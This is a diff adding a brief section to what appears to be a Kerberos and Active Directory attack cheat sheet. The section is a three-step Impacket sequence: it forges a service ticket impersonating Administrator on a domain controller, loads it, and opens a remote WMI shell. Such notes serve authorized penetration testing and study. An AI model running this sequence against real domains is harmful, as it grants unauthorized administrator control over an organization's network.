@@ -44,6 +44,14 @@
 
 #### 14) klist
 
+## REMOTE EXPLOITATION EXAMPLE:
+
+#### 1) Impacket-getST -k -impersonate Administrator -spn CIFS/DC.DOMAIN.LOCAL DOMAIN.LOCAL/USERNAME
+
+#### 2) export KRB5CCNAME=Administrator.ccache
+
+#### 3) impacket-wmiexec DOMAIN.LOCAL/Administrator@DC.DOMAIN.LOCAL -k -no-pass
+
 # Kerberos Constrained Delegation
 
 | Command                                                      | Description                                                  |
